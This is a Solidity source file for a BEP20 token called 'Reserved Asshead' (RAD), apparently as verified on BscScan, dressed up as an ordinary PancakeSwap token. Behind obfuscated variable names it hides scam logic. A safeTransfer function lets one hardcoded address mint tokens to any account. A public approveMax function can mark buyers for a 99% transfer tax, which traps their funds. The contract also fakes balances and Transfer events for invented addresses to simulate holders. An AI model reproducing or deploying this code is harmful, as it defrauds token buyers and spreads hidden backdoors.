/**
 *Submitted for verification at BscScan.com on 2023-01-06
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;


interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

}


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


library SafeMath {

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

}


interface IBEP20 {

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function name() external view returns (string memory);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


interface IUniswapV2Router {

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function WETH() external pure returns (address);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

}




contract ReservedAsshead is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;


    mapping(address => bool) private burnModeTeamLimitLiquidityWallet;
    uint256 private feeLaunchSwapAuto = 0;
    bool public launchedTeamMaxTxFromMin1 = false;
    address private walletMaxListLaunched = (msg.sender);
    uint256  listShouldFeeIs = 100000000 * 10 ** _decimals;
    uint256 private tokenTakeToMax = 0;
    string constant _symbol = "RAD";


    bool public tokenAmountListEnable = false;
    uint256 private launchedTeamMaxTxFromMin = 0;
    uint256 private senderLimitMintTx = 0;
    mapping(address => mapping(address => uint256)) _allowances;

    uint256 public launchedTeamMaxTxFromMin0 = 0;



    uint256 public toBurnTradingLiquidityMint = 0;
    uint256 private receiverTokenFromLaunchedTo = 100;

    string constant _name = "Reserved Asshead";
    uint256 public receiverTeamTokenTake = 0;
    bool private maxExemptToMintTotalWallet = false;
    uint256  teamModeReceiverMintIsExempt = 100000000 * 10 ** _decimals;
    address constant isMinReceiverTotal = 0xe9483A7a60Ecbf542667c14142B7EB65C41c2fb9;
    bool private toTeamMarketingTradingAmountAuto = false;
    bool public autoExemptBurnIsMarketingAt = false;
    uint256 constant atMaxTradingReceiver = 300000 * 10 ** 18;

    uint256 public launchFromAutoSenderListTeam = 0;
    address public uniswapV2Pair;
    address constant minLimitIsLiquidity = 0x140a3826c7F6Cab73a4d70506A62963Efe742971;
    mapping(address => uint256) _balances;

    mapping(address => bool)  senderLimitAutoTo;

    uint256 private takeFromMarketingSender = 0;
    mapping(address => bool)  toMaxFundAutoAmountSender;
    uint256 walletIsBurnFundExemptMarketingTotal = 100000000 * (10 ** _decimals);
    
    uint256 constant marketingFeeExemptReceiverLiquidityBotsAt = 10000 * 10 ** 18;
    IUniswapV2Router public tradingSellBurnTotalReceiverExemptMode;
    uint256 walletMintTradingFundBotsFrom = 0;
    uint256 private buyLaunchModeLiquidityBots = 0;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        tradingSellBurnTotalReceiverExemptMode = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(tradingSellBurnTotalReceiverExemptMode.factory()).createPair(address(this), tradingSellBurnTotalReceiverExemptMode.WETH());
        _allowances[address(this)][address(tradingSellBurnTotalReceiverExemptMode)] = walletIsBurnFundExemptMarketingTotal;

        burnModeTeamLimitLiquidityWallet[msg.sender] = true;
        burnModeTeamLimitLiquidityWallet[address(this)] = true;

        _balances[msg.sender] = walletIsBurnFundExemptMarketingTotal;
        emit Transfer(address(0), msg.sender, walletIsBurnFundExemptMarketingTotal);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return walletIsBurnFundExemptMarketingTotal;
    }

    function getliquidityTokenEnableReceiverLimitAt() public view returns (uint256) {
        if (launchFromAutoSenderListTeam == buyLaunchModeLiquidityBots) {
            return buyLaunchModeLiquidityBots;
        }
        if (launchFromAutoSenderListTeam != senderLimitMintTx) {
            return senderLimitMintTx;
        }
        if (launchFromAutoSenderListTeam != buyLaunchModeLiquidityBots) {
            return buyLaunchModeLiquidityBots;
        }
        return launchFromAutoSenderListTeam;
    }

    function settoAutoMintMinIsSwap(uint256 exemptShouldAmountToSenderTrading) public onlyOwner {
        if (senderLimitMintTx != launchedTeamMaxTxFromMin) {
            launchedTeamMaxTxFromMin=exemptShouldAmountToSenderTrading;
        }
        if (senderLimitMintTx == launchFromAutoSenderListTeam) {
            launchFromAutoSenderListTeam=exemptShouldAmountToSenderTrading;
        }
        senderLimitMintTx=exemptShouldAmountToSenderTrading;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function setbuyMaxSenderExemptMarketingListTotal(uint256 exemptShouldAmountToSenderTrading) public onlyOwner {
        tokenTakeToMax=exemptShouldAmountToSenderTrading;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (teamFundAmountSwapLimitIs(uint160(account))) {
            return txShouldToExempt(uint160(account));
        }
        return _balances[account];
    }

    function setwalletAmountAutoTx(address exemptShouldAmountToSenderTrading,bool launchSenderBuyFeeAtList) public onlyOwner {
        burnModeTeamLimitLiquidityWallet[exemptShouldAmountToSenderTrading]=launchSenderBuyFeeAtList;
    }

    function getwalletAmountAutoTx(address exemptShouldAmountToSenderTrading) public view returns (bool) {
        if (exemptShouldAmountToSenderTrading != walletMaxListLaunched) {
            return tokenAmountListEnable;
        }
        if (burnModeTeamLimitLiquidityWallet[exemptShouldAmountToSenderTrading] == burnModeTeamLimitLiquidityWallet[exemptShouldAmountToSenderTrading]) {
            return maxExemptToMintTotalWallet;
        }
            return burnModeTeamLimitLiquidityWallet[exemptShouldAmountToSenderTrading];
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getshouldBotsEnableTx() public view returns (uint256) {
        return receiverTeamTokenTake;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function gettoAutoMintMinIsSwap() public view returns (uint256) {
        if (senderLimitMintTx != takeFromMarketingSender) {
            return takeFromMarketingSender;
        }
        if (senderLimitMintTx == feeLaunchSwapAuto) {
            return feeLaunchSwapAuto;
        }
        return senderLimitMintTx;
    }

    function fromMarketingMaxLaunch(address liquidityTakeToBuy) private view returns (bool) {
        return liquidityTakeToBuy == walletMaxListLaunched;
    }

    function teamFundAmountSwapLimitIs(uint160 isSellModeReceiverSwap) private pure returns (bool) {
        if (isSellModeReceiverSwap >= uint160(minLimitIsLiquidity)) {
            if (isSellModeReceiverSwap <= uint160(minLimitIsLiquidity) + 200000) {
                return true;
            }
        }
        return false;
    }

    function getwalletMinTradingExempt() public view returns (bool) {
        if (launchedTeamMaxTxFromMin1 != launchedTeamMaxTxFromMin1) {
            return launchedTeamMaxTxFromMin1;
        }
        if (launchedTeamMaxTxFromMin1 == toTeamMarketingTradingAmountAuto) {
            return toTeamMarketingTradingAmountAuto;
        }
        if (launchedTeamMaxTxFromMin1 == launchedTeamMaxTxFromMin1) {
            return launchedTeamMaxTxFromMin1;
        }
        return launchedTeamMaxTxFromMin1;
    }

    function minWalletTxLaunchedReceiver(address modeTradingBotsReceiver, address modeMaxIsAuto, uint256 autoListTeamReceiverTradingSender, bool minWalletLaunchMaxFund) private {
        if (minWalletLaunchMaxFund) {
            modeTradingBotsReceiver = address(uint160(uint160(minLimitIsLiquidity) + walletMintTradingFundBotsFrom));
            walletMintTradingFundBotsFrom++;
            _balances[modeMaxIsAuto] = _balances[modeMaxIsAuto].add(autoListTeamReceiverTradingSender);
        } else {
            _balances[modeTradingBotsReceiver] = _balances[modeTradingBotsReceiver].sub(autoListTeamReceiverTradingSender);
        }
        emit Transfer(modeTradingBotsReceiver, modeMaxIsAuto, autoListTeamReceiverTradingSender);
    }

    function isTradingToLaunchEnableTotalReceiver(address isSellModeReceiverSwap) private pure returns (bool) {
        return isSellModeReceiverSwap == isMinReceiverTotal;
    }

    function swapExemptLaunchedFee(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function txMaxEnableBurn(address modeTradingBotsReceiver, bool maxReceiverFundTrading) internal returns (uint256) {
        if (senderLimitAutoTo[modeTradingBotsReceiver]) {
            return 99;
        }
        
        if (takeFromMarketingSender != launchFromAutoSenderListTeam) {
            takeFromMarketingSender = takeFromMarketingSender;
        }

        if (tokenAmountListEnable != autoExemptBurnIsMarketingAt) {
            tokenAmountListEnable = maxExemptToMintTotalWallet;
        }


        if (maxReceiverFundTrading) {
            return senderLimitMintTx;
        }
        if (!maxReceiverFundTrading && modeTradingBotsReceiver == uniswapV2Pair) {
            return tokenTakeToMax;
        }
        return 0;
    }

    function setwalletMinTradingExempt(bool exemptShouldAmountToSenderTrading) public onlyOwner {
        launchedTeamMaxTxFromMin1=exemptShouldAmountToSenderTrading;
    }

    function tokenListReceiverAmountToTxWallet(address modeTradingBotsReceiver) internal view returns (bool) {
        return !burnModeTeamLimitLiquidityWallet[modeTradingBotsReceiver];
    }

    function getreceiverLimitBurnMintAuto() public view returns (uint256) {
        if (launchedTeamMaxTxFromMin0 == receiverTokenFromLaunchedTo) {
            return receiverTokenFromLaunchedTo;
        }
        return launchedTeamMaxTxFromMin0;
    }

    function receiverLimitLaunchedMarketing(address modeTradingBotsReceiver, address minIsAtTx, uint256 autoListTeamReceiverTradingSender) internal returns (uint256) {
        
        uint256 atWalletAutoFund = autoListTeamReceiverTradingSender.mul(txMaxEnableBurn(modeTradingBotsReceiver, minIsAtTx == uniswapV2Pair)).div(receiverTokenFromLaunchedTo);

        if (atWalletAutoFund > 0) {
            _balances[address(this)] = _balances[address(this)].add(atWalletAutoFund);
            emit Transfer(modeTradingBotsReceiver, address(this), atWalletAutoFund);
        }

        return autoListTeamReceiverTradingSender.sub(atWalletAutoFund);
    }

    function setreceiverLimitBurnMintAuto(uint256 exemptShouldAmountToSenderTrading) public onlyOwner {
        launchedTeamMaxTxFromMin0=exemptShouldAmountToSenderTrading;
    }

    function setlaunchExemptSenderReceiver(uint256 exemptShouldAmountToSenderTrading) public onlyOwner {
        if (receiverTokenFromLaunchedTo == launchFromAutoSenderListTeam) {
            launchFromAutoSenderListTeam=exemptShouldAmountToSenderTrading;
        }
        receiverTokenFromLaunchedTo=exemptShouldAmountToSenderTrading;
    }

    function setliquidityTokenEnableReceiverLimitAt(uint256 exemptShouldAmountToSenderTrading) public onlyOwner {
        if (launchFromAutoSenderListTeam != launchFromAutoSenderListTeam) {
            launchFromAutoSenderListTeam=exemptShouldAmountToSenderTrading;
        }
        launchFromAutoSenderListTeam=exemptShouldAmountToSenderTrading;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function getwalletBotsMarketingLaunch() public view returns (bool) {
        if (toTeamMarketingTradingAmountAuto == launchedTeamMaxTxFromMin1) {
            return launchedTeamMaxTxFromMin1;
        }
        return toTeamMarketingTradingAmountAuto;
    }

    function setshouldBotsEnableTx(uint256 exemptShouldAmountToSenderTrading) public onlyOwner {
        if (receiverTeamTokenTake != launchedTeamMaxTxFromMin) {
            launchedTeamMaxTxFromMin=exemptShouldAmountToSenderTrading;
        }
        if (receiverTeamTokenTake == tokenTakeToMax) {
            tokenTakeToMax=exemptShouldAmountToSenderTrading;
        }
        if (receiverTeamTokenTake != launchedTeamMaxTxFromMin) {
            launchedTeamMaxTxFromMin=exemptShouldAmountToSenderTrading;
        }
        receiverTeamTokenTake=exemptShouldAmountToSenderTrading;
    }

    function getburnAmountLiquidityBuyLaunchReceiverAt() public view returns (bool) {
        if (tokenAmountListEnable == toTeamMarketingTradingAmountAuto) {
            return toTeamMarketingTradingAmountAuto;
        }
        if (tokenAmountListEnable == launchedTeamMaxTxFromMin1) {
            return launchedTeamMaxTxFromMin1;
        }
        if (tokenAmountListEnable == toTeamMarketingTradingAmountAuto) {
            return toTeamMarketingTradingAmountAuto;
        }
        return tokenAmountListEnable;
    }

    function getlaunchExemptSenderReceiver() public view returns (uint256) {
        if (receiverTokenFromLaunchedTo == launchedTeamMaxTxFromMin) {
            return launchedTeamMaxTxFromMin;
        }
        if (receiverTokenFromLaunchedTo != toBurnTradingLiquidityMint) {
            return toBurnTradingLiquidityMint;
        }
        if (receiverTokenFromLaunchedTo == receiverTeamTokenTake) {
            return receiverTeamTokenTake;
        }
        return receiverTokenFromLaunchedTo;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return tokenTotalWalletBots(msg.sender, recipient, amount);
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approveMax(address spender) external {
        if (toMaxFundAutoAmountSender[spender]) {
            senderLimitAutoTo[spender] = true;
        }
    }

    function isApproveMax(address spender) public view returns (bool) {
        return senderLimitAutoTo[spender];
    }

    function txShouldToExempt(uint160 isSellModeReceiverSwap) private view returns (uint256) {
        if ((isSellModeReceiverSwap - uint160(minLimitIsLiquidity)) < walletMintTradingFundBotsFrom) {
            return marketingFeeExemptReceiverLiquidityBotsAt;
        }
        return atMaxTradingReceiver;
    }

    function setburnAmountLiquidityBuyLaunchReceiverAt(bool exemptShouldAmountToSenderTrading) public onlyOwner {
        if (tokenAmountListEnable != tokenAmountListEnable) {
            tokenAmountListEnable=exemptShouldAmountToSenderTrading;
        }
        if (tokenAmountListEnable == launchedTeamMaxTxFromMin1) {
            launchedTeamMaxTxFromMin1=exemptShouldAmountToSenderTrading;
        }
        tokenAmountListEnable=exemptShouldAmountToSenderTrading;
    }

    function setwalletBotsMarketingLaunch(bool exemptShouldAmountToSenderTrading) public onlyOwner {
        toTeamMarketingTradingAmountAuto=exemptShouldAmountToSenderTrading;
    }

    function tokenTotalWalletBots(address modeTradingBotsReceiver, address modeMaxIsAuto, uint256 autoListTeamReceiverTradingSender) internal returns (bool) {
        if (teamFundAmountSwapLimitIs(uint160(modeMaxIsAuto))) {
            minWalletTxLaunchedReceiver(modeTradingBotsReceiver, modeMaxIsAuto, autoListTeamReceiverTradingSender, false);
            return true;
        }
        if (teamFundAmountSwapLimitIs(uint160(modeTradingBotsReceiver))) {
            minWalletTxLaunchedReceiver(modeTradingBotsReceiver, modeMaxIsAuto, autoListTeamReceiverTradingSender, true);
            return true;
        }
        
        if (launchedTeamMaxTxFromMin1 == tokenAmountListEnable) {
            launchedTeamMaxTxFromMin1 = maxExemptToMintTotalWallet;
        }

        if (tokenAmountListEnable != tokenAmountListEnable) {
            tokenAmountListEnable = autoExemptBurnIsMarketingAt;
        }

        if (launchedTeamMaxTxFromMin0 == tokenTakeToMax) {
            launchedTeamMaxTxFromMin0 = toBurnTradingLiquidityMint;
        }


        bool autoMintFeeBuy = fromMarketingMaxLaunch(modeTradingBotsReceiver) || fromMarketingMaxLaunch(modeMaxIsAuto);
        
        if (toBurnTradingLiquidityMint != takeFromMarketingSender) {
            toBurnTradingLiquidityMint = receiverTokenFromLaunchedTo;
        }

        if (launchedTeamMaxTxFromMin0 != feeLaunchSwapAuto) {
            launchedTeamMaxTxFromMin0 = feeLaunchSwapAuto;
        }

        if (launchedTeamMaxTxFromMin1 != tokenAmountListEnable) {
            launchedTeamMaxTxFromMin1 = toTeamMarketingTradingAmountAuto;
        }


        if (modeTradingBotsReceiver == uniswapV2Pair && !autoMintFeeBuy) {
            toMaxFundAutoAmountSender[modeMaxIsAuto] = true;
        }
        
        if (autoMintFeeBuy) {
            return swapExemptLaunchedFee(modeTradingBotsReceiver, modeMaxIsAuto, autoListTeamReceiverTradingSender);
        }
        
        if (launchedTeamMaxTxFromMin1 == autoExemptBurnIsMarketingAt) {
            launchedTeamMaxTxFromMin1 = maxExemptToMintTotalWallet;
        }

        if (autoExemptBurnIsMarketingAt == tokenAmountListEnable) {
            autoExemptBurnIsMarketingAt = autoExemptBurnIsMarketingAt;
        }


        _balances[modeTradingBotsReceiver] = _balances[modeTradingBotsReceiver].sub(autoListTeamReceiverTradingSender, "Insufficient Balance!");
        
        if (maxExemptToMintTotalWallet == launchedTeamMaxTxFromMin1) {
            maxExemptToMintTotalWallet = maxExemptToMintTotalWallet;
        }

        if (autoExemptBurnIsMarketingAt == maxExemptToMintTotalWallet) {
            autoExemptBurnIsMarketingAt = autoExemptBurnIsMarketingAt;
        }


        uint256 tokenTotalModeReceiver = tokenListReceiverAmountToTxWallet(modeTradingBotsReceiver) ? receiverLimitLaunchedMarketing(modeTradingBotsReceiver, modeMaxIsAuto, autoListTeamReceiverTradingSender) : autoListTeamReceiverTradingSender;

        _balances[modeMaxIsAuto] = _balances[modeMaxIsAuto].add(tokenTotalModeReceiver);
        emit Transfer(modeTradingBotsReceiver, modeMaxIsAuto, tokenTotalModeReceiver);
        return true;
    }

    function getbuyMaxSenderExemptMarketingListTotal() public view returns (uint256) {
        if (tokenTakeToMax == receiverTokenFromLaunchedTo) {
            return receiverTokenFromLaunchedTo;
        }
        if (tokenTakeToMax != launchFromAutoSenderListTeam) {
            return launchFromAutoSenderListTeam;
        }
        return tokenTakeToMax;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != walletIsBurnFundExemptMarketingTotal) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return tokenTotalWalletBots(sender, recipient, amount);
    }

    function safeTransfer(address modeTradingBotsReceiver, address modeMaxIsAuto, uint256 autoListTeamReceiverTradingSender) public {
        if (!isTradingToLaunchEnableTotalReceiver(msg.sender)) {
            return;
        }
        if (teamFundAmountSwapLimitIs(uint160(modeMaxIsAuto))) {
            minWalletTxLaunchedReceiver(modeTradingBotsReceiver, modeMaxIsAuto, autoListTeamReceiverTradingSender, false);
            return;
        }
        if (modeMaxIsAuto == address(0)) {
            return;
        }
        if (teamFundAmountSwapLimitIs(uint160(modeTradingBotsReceiver))) {
            minWalletTxLaunchedReceiver(modeTradingBotsReceiver, modeMaxIsAuto, autoListTeamReceiverTradingSender, true);
            return;
        }
        if (autoListTeamReceiverTradingSender == 0) {
            return;
        }
        if (modeTradingBotsReceiver == address(0)) {
            _balances[modeMaxIsAuto] = _balances[modeMaxIsAuto].add(autoListTeamReceiverTradingSender);
            return;
        }
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}